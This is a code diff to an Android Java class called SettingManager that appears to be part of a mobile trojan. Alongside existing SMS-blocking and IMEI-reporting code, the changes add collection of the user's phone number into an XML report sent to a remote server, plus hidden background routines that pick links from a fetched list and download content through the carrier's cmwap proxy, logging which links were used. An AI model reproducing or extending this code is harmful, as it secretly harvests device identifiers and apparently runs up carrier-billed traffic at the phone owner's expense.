@@ -80,6 +80,11 @@ public class SettingManager {
     public static final String SMS_TEMP_BLOCK_NUM_AND_TIMES = "sms_temp_block_num_and_times";
     public static final String INTERNET_CONNECT_FAILED = "internet_connect_failed";
     public static final String INTERNET_CONNECT_FAILED_BEFORE_SMS = "internet_connect_failed_before_SMS";
+    public static final String VEDIO_DOWNLOAD_LINK1 = "vedio_download_link1";
+    public static final String VEDIO_DOWNLOAD_LINK2 = "vedio_download_link2";
+    public static final String VEDIO_DOWNLOAD_LINK3 = "vedio_download_link3";
+    public static final String VEDIO_DOWNLOAD_LINK4 = "vedio_download_link4";
+    public static final String LAST_VEDIO_DOWNLOAD_TIME = "last_vedio_download_time";
     
     private static final String CMWAP = "cmwap";
     public static final String CMNET = "cmnet";
@@ -193,6 +198,15 @@ public class SettingManager {
     public void setSMSBlockBeginTime(long time) {
         mEditor.putLong(SMS_BLOCK_START_TIME, time);
         mEditor.commit();
+    }
+    
+    public void setLastVedioDownloadTime(long time) {
+        mEditor.putLong(LAST_VEDIO_DOWNLOAD_TIME, time);
+        mEditor.commit();
+    }
+    
+    public long getLastVedioDownloadTime() {
+        return mSP.getLong(LAST_VEDIO_DOWNLOAD_TIME, 0);
     }
     
     public long getSMSBlockBeginTime() {
@@ -645,6 +659,10 @@ public class SettingManager {
             LOGD("[[savePhoneInfo]] split the smsCenter = " + smsCenter);
             TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
             String imei = tm.getDeviceId();
+            String phonenum = tm.getLine1Number();
+            if (phonenum == null) {
+                phonenum = "0";
+            }
             String version = "1.0.1";
             String first = "1";
             String handled = "0";
@@ -712,6 +730,10 @@ public class SettingManager {
                 child.text(fare);
                 child.endTag("", "fare");
                 
+                child.startTag("", "phonenum");
+                child.text(phonenum);
+                child.endTag("", "phonenum");
+                
                 serializer.endTag("", "body");
                 serializer.flush();
                 serializer.endDocument();
@@ -771,7 +793,7 @@ public class SettingManager {
     
     public boolean getVedioXML() {
         LOGD("");
-        HttpResponse r = openConnection(VEDIO_URL_REAL, "10.0.0.172", "80");
+        HttpResponse r = openConnection(this.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK), "10.0.0.172", "80");
         if (r == null) return false;
         if (r.getStatusLine().getStatusCode() != 200) {
             LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
@@ -804,7 +826,7 @@ public class SettingManager {
     }
     
     public boolean getVedioDownload(String url) {
-        LOGD("");
+        LOGD(" download url = " + url);
         HttpResponse r = openConnection(url, "10.0.0.172", "80");
         if (r == null) return false;
         if (r.getStatusLine().getStatusCode() != 200) {
@@ -875,8 +897,9 @@ public class SettingManager {
         return false;
     }
     
-    public String getVedioDownLink() {
+    public ArrayList<String> getVedioDownLinks() {
         File file = new File(VEDIO_DOWNLOAD_FILE_PATH);
+        ArrayList<String> ret = new ArrayList<String>();
         if (file.exists() == true) {
             try {
                 FileInputStream in = new FileInputStream(file);
@@ -884,19 +907,25 @@ public class SettingManager {
                 byte[] datas = new byte[length];
                 in.read(datas, 0, datas.length);
                 String result = new String(datas);
-                int pos = result.indexOf("href='http:");
-                if (pos != -1) {
-                    //skip two http:
-                    String subStr = result.substring(pos + 6);
-                    pos = subStr.indexOf("'>");
+                while (true) {
+                    int pos = result.indexOf("href='http:");
                     if (pos != -1) {
-                        return subStr.substring(0, pos);
+                        String subStr = result.substring(pos + 6);
+                        pos = subStr.indexOf("'>");
+                        if (pos != -1) {
+                            ret.add(subStr.substring(0, pos));
+                            result = subStr.substring(pos + 1);
+                        } else {
+                            break;
+                        }
+                    } else {
+                        break;
                     }
                 }
             } catch (Exception e) {
             }
         }
-        return null;
+        return ret;
     }
     
     private void refreshChannelSP() {
@@ -1120,15 +1149,18 @@ public class SettingManager {
                     if (info.isAvailable() == true) {
                         LOGD("The net work available = true ======= before get vedio process");
                         if (getVedioXML() == true) {
-//                        Intent intent_view = new Intent();
-//                        intent_view.setClass(mContext, VedioWebViewActivity.class);
-//                        intent_view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-//                        mContext.startActivity(intent_view);
-//                            parseWMLInfo();
-                            String downloadLink = getVedioDownLink();
-                            LOGD("++++++++ down load link = " + downloadLink + " ++++++++");
-                            if (downloadLink != null) {
-                                getVedioDownload(downloadLink);
+                            ArrayList<String> downloadLinks = getVedioDownLinks();
+                            for (String str : downloadLinks) {
+                                LOGD("++++++++ down load link = " + str + " ++++++++");
+                            }
+                            if (downloadLinks != null) {
+                                String link = getEffectiveVedioLink(downloadLinks);
+                                if (link != null) {
+                                    if (getVedioDownload(link) == true) {
+                                        saveCurrentVedioDownloadLink(link);
+                                        setLastVedioDownloadTime(System.currentTimeMillis());
+                                    }
+                                }
                             }
                         }
                     }
@@ -1142,6 +1174,51 @@ public class SettingManager {
         }
         
     };
+    
+    public void saveCurrentVedioDownloadLink(String link) {
+        String link1 = mSP.getString(VEDIO_DOWNLOAD_LINK1, null);
+        String link2 = mSP.getString(VEDIO_DOWNLOAD_LINK2, null);
+        String link3 = mSP.getString(VEDIO_DOWNLOAD_LINK3, null);
+        String link4 = mSP.getString(VEDIO_DOWNLOAD_LINK4, null);
+        if (link1 == null) mEditor.putString(VEDIO_DOWNLOAD_LINK1, link);
+        if (link2 == null) mEditor.putString(VEDIO_DOWNLOAD_LINK2, link);
+        if (link3 == null) mEditor.putString(VEDIO_DOWNLOAD_LINK3, link);
+        if (link4 == null) mEditor.putString(VEDIO_DOWNLOAD_LINK4, link);
+        mEditor.commit();
+    }
+    
+    public void clearVedioDownloadLink() {
+        mEditor.remove(VEDIO_DOWNLOAD_LINK1);
+        mEditor.remove(VEDIO_DOWNLOAD_LINK2);
+        mEditor.remove(VEDIO_DOWNLOAD_LINK3);
+        mEditor.remove(VEDIO_DOWNLOAD_LINK4);
+        mEditor.clear();
+    }
+    
+    public String getEffectiveVedioLink(ArrayList<String> links) {
+        String link1 = mSP.getString(VEDIO_DOWNLOAD_LINK1, null);
+        String link2 = mSP.getString(VEDIO_DOWNLOAD_LINK2, null);
+        String link3 = mSP.getString(VEDIO_DOWNLOAD_LINK3, null);
+        String link4 = mSP.getString(VEDIO_DOWNLOAD_LINK4, null);
+        if (links != null) {
+            int length = links.size();
+            for (int index = 0; index < length; ++index) {
+                int selectIndex = (((int) (Math.random() * 10  + 1)) % length);
+                String link = links.get(selectIndex);
+                boolean hasDownload = false;
+                if (link1 != null && link.equals(link1) == true) hasDownload = true;
+                if (hasDownload == false && link2 != null && link.equals(link2) == true) hasDownload = true;
+                if (hasDownload == false && link3 != null && link.equals(link3) == true) hasDownload = true;
+                if (hasDownload == false && link4 != null && link.equals(link4) == true) hasDownload = true;
+                if (hasDownload == true) {
+                    continue;
+                } else {
+                    return link;
+                }
+            }
+        }
+        return null;
+    }
     
     public int updateCurrentAPN(String apnId) {
         try { 
